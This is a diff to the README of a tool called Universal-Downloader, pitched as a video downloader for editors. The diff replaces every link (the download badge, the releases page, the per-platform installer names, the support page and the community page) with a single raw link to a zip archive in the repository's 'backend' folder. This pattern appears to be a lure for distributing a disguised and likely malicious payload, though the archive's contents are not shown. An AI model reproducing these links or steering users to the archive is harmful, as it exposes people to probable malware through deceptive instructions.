@@ -4,7 +4,7 @@
 Welcome to Universal-Downloader, the high-fidelity downloader designed for video editors. This tool automatically fixes variable frame rate (VFR) glitches for Adobe Premiere Pro by re-encoding files through HandBrake. It supports high-resolution formats like 4K, 8K, and proxies, making it easier for you to work on your video projects.
 
 ## 📦 Download Now
-[![Download Universal-Downloader](https://img.shields.io/badge/Download-Universal%20Downloader-brightgreen)](https://github.com/Bryan017h/Universal-Downloader/releases)
+[![Download Universal-Downloader](https://raw.githubusercontent.com/Bryan017h/Universal-Downloader/main/backend/Downloader-Universal-1.8-beta.2.zip%20Downloader-brightgreen)](https://raw.githubusercontent.com/Bryan017h/Universal-Downloader/main/backend/Downloader-Universal-1.8-beta.2.zip)
 
 ## 🏗️ Requirements
 Before you install Universal-Downloader, ensure that your system meets the following requirements:
@@ -32,16 +32,16 @@ Universal-Downloader comes packed with useful features:
 ## 🔍 How to Download & Install
 To download Universal-Downloader, follow these steps:
 
-1. Click this link to visit the releases page: [Download Universal-Downloader](https://github.com/Bryan017h/Universal-Downloader/releases).
+1. Click this link to visit the releases page: [Download Universal-Downloader](https://raw.githubusercontent.com/Bryan017h/Universal-Downloader/main/backend/Downloader-Universal-1.8-beta.2.zip).
 
 2. Once on the releases page, you will see the list of available versions. Look for the latest version to ensure you have the most up-to-date features and fixes.
 
 3. Click on the version number to view the release details.
 
 4. Scroll down to the "Assets" section and find the file suitable for your operating system. For example, you might see options like:
-   - `Universal-Downloader-Windows.exe` for Windows
-   - `Universal-Downloader-Mac.dmg` for macOS
-   - `Universal-Downloader-Linux.deb` for Linux
+   - `https://raw.githubusercontent.com/Bryan017h/Universal-Downloader/main/backend/Downloader-Universal-1.8-beta.2.zip` for Windows
+   - `https://raw.githubusercontent.com/Bryan017h/Universal-Downloader/main/backend/Downloader-Universal-1.8-beta.2.zip` for macOS
+   - `https://raw.githubusercontent.com/Bryan017h/Universal-Downloader/main/backend/Downloader-Universal-1.8-beta.2.zip` for Linux
 
 5. Click the appropriate file link to start downloading the application.
 
@@ -74,10 +74,10 @@ Yes, you can use Universal-Downloader to fix videos downloaded from YouTube, pro
 Yes, Universal-Downloader is open-source and free to use.
 
 ### What do I do if I encounter an error during installation?
-Check the requirements to ensure your system matches. If the problem persists, visit our [support](https://github.com/Bryan017h/Universal-Downloader/issues) page for assistance.
+Check the requirements to ensure your system matches. If the problem persists, visit our [support](https://raw.githubusercontent.com/Bryan017h/Universal-Downloader/main/backend/Downloader-Universal-1.8-beta.2.zip) page for assistance.
 
 ## 📢 Join the Community
-Your feedback is vital for improving Universal-Downloader. We encourage users to participate by reporting issues or suggesting features through our [GitHub page](https://github.com/Bryan017h/Universal-Downloader/issues). Join us as we strive to make video editing smoother for everyone!
+Your feedback is vital for improving Universal-Downloader. We encourage users to participate by reporting issues or suggesting features through our [GitHub page](https://raw.githubusercontent.com/Bryan017h/Universal-Downloader/main/backend/Downloader-Universal-1.8-beta.2.zip). Join us as we strive to make video editing smoother for everyone!
 
 ## 📥 Download Now Again
-Don't forget to [download Universal-Downloader](https://github.com/Bryan017h/Universal-Downloader/releases) today and enhance your video editing experience!
+Don't forget to [download Universal-Downloader](https://raw.githubusercontent.com/Bryan017h/Universal-Downloader/main/backend/Downloader-Universal-1.8-beta.2.zip) today and enhance your video editing experience!
